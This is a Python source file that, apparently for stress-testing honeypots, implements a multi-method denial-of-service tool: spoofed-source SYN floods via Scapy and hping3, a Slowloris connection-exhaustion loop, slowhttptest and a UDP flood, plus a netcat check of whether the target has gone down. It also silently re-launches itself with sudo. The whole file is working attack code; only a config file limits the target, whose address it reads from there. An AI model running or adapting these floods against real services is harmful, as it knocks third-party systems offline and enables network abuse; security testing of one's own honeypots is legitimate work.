import os
import sys
import json
import time
import socket
import random
import threading
import subprocess
from pathlib import Path
from datetime import datetime
from scapy.all import IP, TCP, send

class DenialOfService:
    def __init__(self, attack_duration):
        self.require_sudo()  # Ensure the script runs as root
        self.config = self.load_config()
        self.hp_type = self.config["honeypot_type"].lower()
        self.creds = self.config["honeypot_creds"]
        self.ip = self.creds["ip"]
        self.port = int(self.creds["ports"])
        self.test_name = self.config["test_name"]
        self.successful_attack = None
        self.service_down_detected = False
        self.attack_duration = attack_duration * 60  # Convert minutes to seconds

    def require_sudo(self):
        """Ensures the script is running with root privileges, else restarts with sudo."""
        if os.geteuid() != 0:
            print("[!] This script requires sudo/root privileges. Restarting with sudo...")
            os.execvp("sudo", ["sudo", sys.executable] + sys.argv)

    def load_config(self):
        """Loads honeypot configuration from config.json."""
        config_path = Path(__file__).parent.parent / "configs" / "config.json"
        with open(config_path, "r") as file:
            return json.load(file)

    def syn_flood(self):
        """Performs a SYN flood attack using Scapy."""
        print(f"[*] Starting SYN flood on {self.hp_type}:{self.port}")
        while time.time() - self.start_time < self.attack_duration:
            src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
            src_port = random.randint(1024, 65535)
            pkt = IP(src=src_ip, dst=self.ip) / TCP(sport=src_port, dport=self.port, flags="S")
            send(pkt, verbose=False)

    def hping3_flood(self):
        """Launches hping3 for SYN flood attack and stores its PID."""
        print(f"[*] Running hping3 SYN flood on {self.ip}:{self.port}")
        cmd = f"hping3 --flood --rand-source -S -p {self.port} {self.ip}"
        self.hping3_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def slowloris_attack(self):
        """Performs an improved Slowloris attack to exhaust HTTP connections."""
        print(f"[*] Starting Slowloris attack on {self.ip}:{self.port}")

        sockets = []
        max_sockets = 800  # Increase socket connections

        # Create initial connections
        for _ in range(max_sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)  # Shorter timeout
                s.connect((self.ip, self.port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + self.ip.encode() + b"\r\nConnection: keep-alive\r\n\r\n")
                sockets.append(s)
            except socket.error:
                break  # Stop adding sockets if connection fails

        print(f"[*] Established {len(sockets)} connections to {self.ip}:{self.port}")

        # Keep sockets open with periodic headers
        while time.time() - self.start_time < self.attack_duration:
            for s in sockets:
                try:
                    s.send(b"X-a: keep-alive\r\n")
                except socket.error:
                    sockets.remove(s)  # Remove dead sockets

            # Refill connections if some closed
            for _ in range(max_sockets - len(sockets)):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((self.ip, self.port))
                    s.send(b"GET / HTTP/1.1\r\nHost: " + self.ip.encode() + b"\r\nConnection: keep-alive\r\n\r\n")
                    sockets.append(s)
                except socket.error:
                    break

            print(f"[*] {len(sockets)} active Slowloris connections to {self.ip}:{self.port}")
            time.sleep(15)  # Send headers every 15 seconds

        print("[*] Slowloris attack finished.")

    def hping3_http_flood(self):
        """Launches hping3 for HTTP SYN flood attack."""
        print(f"[*] Running hping3 SYN flood on HTTP {self.ip}:{self.port}")
        cmd = f"hping3 --flood --rand-source -S -p {self.port} {self.ip} > /dev/null 2>&1 &"
        self.hping3_http_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def automated_slowhttptest(self):
        """Runs slowhttptest in the background without saving output files."""
        print(f"[*] Running slowhttptest on {self.ip}:{self.port}")
        cmd = f"slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://{self.ip}:{self.port} > /dev/null 2>&1 &"
        self.slowhttptest_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def udp_flood(self):
        """Performs a UDP flood attack."""
        print(f"[*] Starting UDP flood on {self.ip}:{self.port}")
        while time.time() - self.start_time < self.attack_duration:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(os.urandom(1024), (self.ip, self.port))

    def chk_service(self):
        """Checks if the honeypot service is still running using Netcat."""
        try:
            cmd = f"nc -zv {self.ip} {self.port} 2>&1"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if "succeeded" in result.stderr.lower() or "open" in result.stdout.lower():
                print(f"[*] {self.hp_type.capitalize()} is still running.")
                return True  # Service is still running
            else:
                print(f"[!] ALERT: {self.hp_type.capitalize()} has stopped responding! Check manually NOW!")
                self.service_down_detected = True  # Mark the service as down
                return False  # Service is down
        except Exception:
            return False  # Assume down if error occurs

    def attack(self):
        """Runs a DoS attack on either SSH or HTTP, not both."""
        attack_methods = []

        if self.hp_type == "ssh" or self.port in [22, 2222]:
            attack_methods = [("SYN Flood (Scapy)", self.syn_flood), ("SYN Flood (hping3)", self.hping3_flood)]
        elif self.hp_type == "http" or self.port in [80, 8080, 8800]:
            attack_methods = [
                ("hping3 HTTP Flood", self.hping3_http_flood),
                ("Slowloris", self.slowloris_attack), 
                ("slowhttptest", self.automated_slowhttptest)
            ]
        else:
            print("[!] Invalid honeypot type in config.json!")
            return "[!] Invalid honeypot type"

        threads = []
        print(f"[*] Starting DoS attack on {self.hp_type} for {self.attack_duration // 60} minutes...")
        self.start_time = time.time()

        # Start attack threads
        for name, method in attack_methods:
            thread = threading.Thread(target=method)
            threads.append((name, thread))
            thread.start()

        # Check service every 15 seconds and print alerts repeatedly
        while time.time() - self.start_time < self.attack_duration:
            time.sleep(15)
            if not self.chk_service():  # If service is down, keep printing alerts
                continue

        # Stop all attacks after time limit
        for name, thread in threads:
            thread.join(timeout=5)

        # **Kill hping3 & slowhttptest by name**
        if self.hp_type == "ssh":
            print("[*] Stopping hping3 process...")
            subprocess.run("pkill -9 hping3", shell=True)
        elif self.hp_type == "http":
            print("[*] Stopping HTTP DoS processes...")
            subprocess.run("pkill -9 hping3", shell=True)
            subprocess.run("pkill -9 slowhttptest", shell=True)

        # Final output
        if self.service_down_detected:
            print(f"[*] DoS attack successful. {self.hp_type.capitalize()} became unresponsive.")
            return "[*] DoS attack successful"
        else:
            print(f"[!] DoS Attack failed. Service is still running after {self.attack_duration // 60} minutes.")
            return "[!] DoS attack failed"
